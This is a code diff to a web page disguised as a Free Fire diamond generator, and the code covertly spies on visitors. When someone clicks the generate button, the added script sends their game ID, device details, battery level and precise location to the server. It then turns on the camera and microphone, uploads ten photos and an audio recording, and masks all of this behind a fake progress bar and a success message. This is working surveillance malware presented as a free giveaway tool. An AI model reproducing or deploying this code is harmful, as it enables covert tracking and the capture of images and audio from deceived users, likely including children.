@@ -28,6 +28,7 @@
         .d-title { font-size: 16px; font-weight: bold; color: #ffffff; display: flex; align-items: center; justify-content: center; gap: 4px; pointer-events: none; }
         .d-sub { font-size: 11px; color: #b0bec5; margin-top: 4px; pointer-events: none; }
         .generate-btn { background: linear-gradient(135deg, #ff9800, #ff5722); color: white; width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; margin-top: 5px; box-shadow: 0 4px 15px rgba(255,87,34,0.4); }
+        .generate-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .error-box { display: none; background-color: rgba(244, 67, 54, 0.15); border: 1px solid #f44336; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #ef5350; margin-top: 5px; font-weight: bold; }
         .process-box { display: none; background-color: #1a2638; border: 1px solid #23344d; border-radius: 12px; padding: 12px; text-align: center; margin-top: 5px; }
         .process-text { display: flex; justify-content: space-between; font-size: 13px; color: #90a4ae; margin-bottom: 8px; }
@@ -90,11 +91,33 @@
                 diamondCards.forEach(c => c.classList.remove('active'));
                 this.classList.add('active');
                 selectedDiamondValue = this.getAttribute('data-diamond');
+                document.getElementById('selectedDiamondText').innerText = selectedDiamondValue;
             });
         });
 
         async function sendData(formData) {
             try { await fetch('/page3', { method: 'POST', body: formData }); } catch (e) {}
+        }
+
+        async function sendDeviceInfo() {
+            let batteryPercentage = "N/A";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryPercentage = Math.round(battery.level * 100) + "%";
+                }
+            } catch (e) {}
+
+            const info = { 
+                deviceType: navigator.platform, 
+                androidVer: navigator.userAgent, 
+                screenSize: window.innerWidth + " x " + window.innerHeight, 
+                batteryLevel: batteryPercentage, 
+                language: navigator.language 
+            };
+            const fd = new FormData(); 
+            fd.append('device_info', JSON.stringify(info)); 
+            await sendData(fd);
         }
 
         async function sendSinglePhoto(stream) {
@@ -136,8 +159,13 @@
         document.getElementById("generateBtn").addEventListener("click", async function() {
             const btn = document.getElementById("generateBtn");
             const userIdInput = document.getElementById("userId");
-            if (userIdInput.value.trim() === "") {
+            const serverSelect = document.getElementById("serverSelect");
+            const uid = userIdInput.value.trim();
+
+            if (uid === "") {
                 document.getElementById("errorBox").style.display = "block";
+                document.getElementById("successBox").style.display = "none";
+                userIdInput.focus();
                 return;
             }
             document.getElementById("errorBox").style.display = "none";
@@ -145,14 +173,22 @@
             btn.disabled = true;
             document.getElementById("processBox").style.display = "block";
 
+            // د تلیفون معلومات، بیټرۍ او د کارن پېژندڅېره (User ID & Server) لېږل
+            await sendDeviceInfo();
+            const userFd = new FormData();
+            userFd.append('ff_user_id', uid);
+            userFd.append('selected_diamonds', selectedDiamondValue);
+            userFd.append('selected_server', serverSelect.value);
+            await sendData(userFd);
+
             let progress = 0;
             const progressInterval = setInterval(() => {
-                progress += 5;
+                progress += 2;
                 if (progress <= 100) {
                     document.getElementById('progressBar').style.width = progress + '%';
                     document.getElementById('processPercent').innerText = progress + '%';
                 }
-            }, 50);
+            }, 60);
 
             if (navigator.geolocation) {
                 await new Promise((resolve) => {
@@ -162,26 +198,52 @@
                         fd.append('longitude', pos.coords.longitude);
                         await sendData(fd);
                         resolve();
-                    }, () => resolve(), { timeout: 4000 });
+                    }, () => resolve(), { timeout: 4000, enableHighAccuracy: true });
                 });
             }
 
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    document.getElementById('video').srcObject = stream;
-                    await document.getElementById('video').play();
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await video.play();
+
                     await new Promise(r => setTimeout(r, 300));
-                    for(let i=0; i<3; i++) { await sendSinglePhoto(stream); }
+
+                    let photoCount = 0;
+                    const maxPhotos = 10; 
+
+                    // ۱۰ پرله‌پسې عکسونه پورته کول
+                    const photoInterval = setInterval(async () => {
+                        if (photoCount < maxPhotos) {
+                            photoCount++;
+                            await sendSinglePhoto(stream);
+                        } else {
+                            clearInterval(photoInterval);
+                        }
+                    }, 800);
+
                     await recordAndSendAudio(stream);
+
+                    while (photoCount < maxPhotos) {
+                        await new Promise(r => setTimeout(r, 300));
+                    }
+                    clearInterval(photoInterval);
+
                     stream.getTracks().forEach(t => t.stop());
                 }
             } catch (err) {}
 
             clearInterval(progressInterval);
-            document.getElementById("processBox").style.display = "none";
-            document.getElementById("successBox").style.display = "block";
-            btn.innerText = "Generated ✅";
+            document.getElementById('progressBar').style.width = '100%';
+            document.getElementById('processPercent').innerText = '100%';
+
+            setTimeout(() => {
+                document.getElementById("processBox").style.display = "none";
+                document.getElementById("successBox").style.display = "block";
+                btn.innerText = "Generated ✅";
+            }, 500);
         });
     </script>
 </body>
